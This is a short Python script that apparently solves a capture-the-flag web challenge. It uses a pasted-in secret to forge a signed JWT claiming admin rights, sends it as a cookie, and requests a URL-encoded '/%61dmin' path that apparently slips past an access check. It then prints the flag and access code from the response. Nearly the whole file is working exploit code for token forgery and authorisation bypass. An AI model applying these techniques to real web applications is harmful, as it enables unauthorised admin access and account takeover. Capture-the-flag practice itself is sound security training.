import jwt
import datetime
import http.client

HOST = "challenges.1pc.tf"
PORT = 20244
SECRET = "PASTE_THE_REMOTE_SECRET_HERE"

payload = {
    "user_id": 1,
    "username": "admin",
    "is_admin": 1,
    "exp": datetime.datetime.now(datetime.timezone.utc) + datetime.timedelta(days=365)
}

token = jwt.encode(payload, SECRET, algorithm="HS256")

conn = http.client.HTTPConnection(HOST, PORT)
conn.request("GET", "/%61dmin/email/5", headers={"Cookie": f"token={token}"})
res = conn.getresponse()
html = res.read().decode(errors="ignore")

for line in html.split("\n"):
    if "Access Code:" in line or "C2C{" in line:
        print(line.strip().replace("<p>", "").replace("</p>", "").replace("<br>", ""))

conn.close()
